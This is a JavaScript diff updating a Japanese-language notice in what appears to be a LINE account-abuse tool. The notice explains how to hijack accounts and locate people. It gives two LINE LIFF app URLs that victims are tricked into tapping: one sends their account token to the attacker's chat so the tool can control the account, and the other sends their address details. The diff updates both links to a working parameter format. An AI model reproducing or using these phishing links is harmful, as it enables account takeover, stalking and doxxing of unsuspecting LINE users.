@@ -40,9 +40,9 @@ export const Notifys = [
     {
         title: "token乗っ取り、住所特定等のメソッドを使う方法",
         description: `
-        <p>https://line.naver.jp/R/app/2001110580-p8w3dBZq?path=/@/token を踏ませれば相手がtokenをチャットに送信します。</p>
+        <p>https://line.naver.jp/R/app/2001110580-p8w3dBZq?liff.state=/token を踏ませれば相手がtokenをチャットに送信します。</p>
         <p>そしてToken管理の所に貼ればその乗っ取ったアカウントでマクロ等のツールを使えます。</p>
-        <p>https://line.naver.jp/R/app/2001110580-p8w3dBZq?path=/@/place を踏ませれば相手が住所等の情報をチャットに送信します。</p>
+        <p>https://line.naver.jp/R/app/2001110580-p8w3dBZq?liff.state=/place を踏ませれば相手が住所等の情報をチャットに送信します。</p>
         `
     }
 ].reverse()
